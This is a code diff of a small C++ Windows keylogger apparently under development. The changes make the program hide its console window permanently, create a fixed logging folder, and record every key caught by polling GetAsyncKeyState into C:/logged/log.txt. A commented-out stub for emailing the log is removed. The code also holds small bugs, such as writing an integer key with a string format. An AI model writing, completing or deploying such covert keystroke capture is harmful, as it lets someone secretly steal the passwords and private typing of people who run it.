@@ -4,8 +4,10 @@
 #include<fstream>
 #include <Windows.h>
 #include <time.h>
-#include<direct.h>
-#include "main.h"
+
+
+
+#include "one_time_creation.h"
 
 #pragma warning(disable : 4996)
 
@@ -16,7 +18,7 @@ void logfile(int key)
 	//TODO: create a new path for the logging file
 	
 	FILE* log;
-	log = fopen("log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
+	log = fopen("C:/logged/log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
 	fprintf(log, "%s", &key);
 	fclose(log);
 	
@@ -27,24 +29,19 @@ void logfile(int key)
 
 void hideconsole() 
 {
-	ShowWindow(GetConsoleWindow(), 0);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+
 	//hides the console window to keep the application hidden
-	Sleep(1000);//mill seconds
-	ShowWindow(GetConsoleWindow(), 1);// test purporses 
 
 
-}
-
-/*void emailSender(std::string sender, std::fstream file, bool result)
-{
 
 }
-*/
+
 int main()
 {	
+	path_creation();
 
-
-	hideconsole;
+	hideconsole();
 
 
 
@@ -52,9 +49,9 @@ int main()
 	bool running = true;
 	while (running == true)
 	{
-		int i= 1;
 		//using ascii
-		for (i > 8; i <=255; i++) // starts and end of the mainly used ascii char
+		int i = 0;
+		for (i > 8; i <= 255; i++) // starts and end of the mainly used ascii char
 		{
 
 			if (GetAsyncKeyState(i)== -32767)
